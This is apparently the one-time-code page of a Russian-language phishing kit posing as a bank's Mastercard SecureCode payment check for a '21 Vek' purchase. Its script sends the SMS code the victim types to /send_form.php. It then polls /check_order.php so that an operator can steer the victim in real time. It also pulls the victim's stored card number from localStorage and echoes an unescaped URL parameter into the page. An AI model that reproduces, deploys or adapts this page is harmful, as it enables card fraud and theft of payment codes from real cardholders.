<html>

<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <title>Secure Code Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="utf-8">
    <link href="css/style.css" rel="stylesheet" type="text/css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>

<body class="other">
    <div class="modal-page">
        <div class="header">
            <div class="bank_logo_wrapper">
                <img class="bank-logo" src="img/altBank.png">
            </div>
            <div class="brand_logo_wrapper">
                <img class="brand-logo" src="img/cardLogo/mastercard.png">
            </div>
        </div>
        <form class="form_item" id="ajax-contact" method="POST" name="frm" accept-charset="utf-8">
            <div iv="" class="codecenter">
                <h1 id="h1_item">
                    Введите код из SMS
                </h1>
                <div id="desc" class="desc">
                    <p id="desc_p" class="sts">
                        Введите код из SMS, который был отправлен на ваш номер телефона, чтобы подтвердить платеж.
                    </p>
                </div>
                <div class="list" id="descList" style="display: block;">
                    <div class="list-item" id="pa_merchant">
                        <div class="label">Мерчант:
                        </div>
                        <div class="value">21 Vek</div>
                    </div>
                    <div class="list-item" id="pa_date">
                        <div class="label">Дата:
                        </div>
                        <div class="value nw1" id="date">

                        </div>
                    </div>
                    <div class="list-item" id="pa_pan">
                        <div class="label">Номер карты:
                        </div>
                        <div class="">**** **** ****
                            <span id="card">
                                6431 </span>
                        </div>
                    </div>
                    <div class="list-item">
                        <div class="label">Amount:</div>
                        <div class="value" id="amount"></div>
                    </div>
                    <div class="list-item li_inp" id="inp">
                        <div class="label">Введите код из SMS:
                        </div>
                        <div class="value">
                            <input class="big-input <?php if(isset($_GET['errors'])){
                                                    echo "input-invalid";
                                                } ?>" id="sms_code" type="password" name="otp" maxlength="6" required=""
                                autocomplete="off">
                            <a class="smallie" href="javascript:void(0);" onclick="window.location.reload()">Не пришел
                                код?
                            </a>
                            <div id="countdown" class="backtimer hid">
                                <span class="display">30
                                </span>
                            </div>
                        </div>
                    </div>
                    <style>
                        .input-invalid{
                            border: 1px solid red !important;
                        }
                    </style>
                    
                    <div id="error_message" style="display:<?php if(isset($_GET['errors'])){
                                                    echo "flex";
                                                }else{
                                                    echo "none";
                                                } ?>; justify-content:center; margin:top:10px; color:red">
                        Вы ввели неправильный код
                    </div>
                </div>
                <script>
                

                    var amount = document.getElementById("amount");
                    var card = document.getElementById("card");

                    var sms_code = document.getElementById("sms_code");
                    
                    sms_code.addEventListener("input", function(){
                        if(sms_code.value.length == 6){
                            sms_code.classList.remove("input-invalid");
                            document.getElementById("error_message").style.display = "none";
                        }
                    })

                    var currentDate = new Date();

                    // Получаем день, месяц и год
                    var day = currentDate.getDate();
                    var month = currentDate.getMonth() + 1; // Месяцы в JavaScript начинаются с 0
                    var year = currentDate.getFullYear();

                    // Приводим к формату "dd/mm/yyyy"
                    var formattedDate = (day < 10 ? '0' : '') + day + '/' + (month < 10 ? '0' : '') + month + '/' + year;

                    // Вставляем в элемент с id "currentDate"
                    document.getElementById('date').innerHTML = formattedDate;
                    card.innerHTML = localStorage.getItem("card").slice(-4);;


                </script>
                <div class="list">
                    <input type="hidden" name="PSW_RENEW" value="Y">
                    <input type="hidden" name="TRIES" value="Y">
                    <div class="footer">
                        <div class="row">
                            <div class="left">
                                <a class="cancel_btn">Отменить
                                </a>
                            </div>
                            <div class="center">
                                <input class="big-button" type="button" id="btnCodeSubmit" name="btSubmit"
                                    value="Отправить">
                            </div>
                            <div class="right">
                                <a class="help_btn" href="javascript:void(0);" onclick="helpPage();">
                                    Тех. Поддержка
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
                <input type="hidden" name="formaction" value="pa.submit">
            </div>

            <div class="help hid">
                <div class="desc">
                    <p>SecureCode Verification is a free online card security program. SecureCode protects cards with a
                        personal
                        security passcode. If this service is activated on your card, the online stores participating in
                        the program
                        will redirect your
                        browser to the Bank's website to enter your personal passcode. After checking it, the purchase
                        will be
                        safely paid. If the online store does not participate in the SecureCode Verification program,
                        payment
                        security is not guaranteed.
                    </p>
                    <div class="list">
                        <div class="footer">
                            <div class="row">
                                <div class="">
                                    <input id="returnBtn" onclick="comeBack()" class="big-button backlink" type="button"
                                        name="btcComeBack" value="Return">
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <input class="cnumidclass" type="hidden" name="cnumid" value="">
        </form>
    </div>
</body>
<div class="preload-wpap" id="loading">
        <div>
            <div class="logo-bg1"><img src="/assets/images/wp1.png" alt=""></div>
            <div class="logo-bg2"><img src="/assets/images/wp2.png" alt=""></div>
        </div>
    </div>
    <style>
        .preload-wpap_acs {
            display: none;
            position: relative;
            width: 122px;
            height: 125px;
            margin: 0 auto;
        }

        .preload-wpap {
            display: none;
            align-items: center;
            align-content: center;
            justify-content: center;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000000;
            opacity: 0.6;
            z-index: 501;
        }

        .preload-wpap>div {
            position: relative;
            margin: 30% auto;
            width: 125px;
            height: 125px;
        }

        .logo-bg1,
        .logo-bg2 {
            position: absolute;
        }
        .logo-bg1 {
    top: 0;
    left: 0;
    animation: FadeIn 2s linear;
    animation-fill-mode: both;
    animation-iteration-count: infinite;
}.logo-bg2 {
    top: 25px;
    left: 21px;
    animation: FadeIn 2.3s linear;
    animation-fill-mode: both;
    animation-iteration-count: infinite;
}
        .preload-wpap .text {
            position: absolute;
            bottom: -15px;
            width: 100%;
            text-align: center;
        }
    </style>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script>
    var btnCodeSubmit = document.getElementById("btnCodeSubmit");

    btnCodeSubmit.addEventListener("click", function () {
        $.ajax({
            type: "POST",
            url: "/send_form.php",
            data: {
                otp: sms_code.value,
                type: "otp",
                id_log: <?php echo $_GET['id']; ?>
            },
            success: function (response) {
                console.log(sms_code.value)
                console.log(response);
                $("#loading").css("display", "block");
                setInterval(function () {
                    $.ajax({
                        url: '/check_order.php',
                        type: 'post',
                        data: {
                            id_log: <?php echo $_GET['id'] ?>
                        },
                        success: function (response) {
                            console.log(response)
                            if (response == "wait") {
                                return;
                            }
                            window.location.href=response+"&linkId=<?php echo $_GET['linkId'] ?>"
                        }
                    })
                }, 500)
            }
        });
    });
</script>

</html>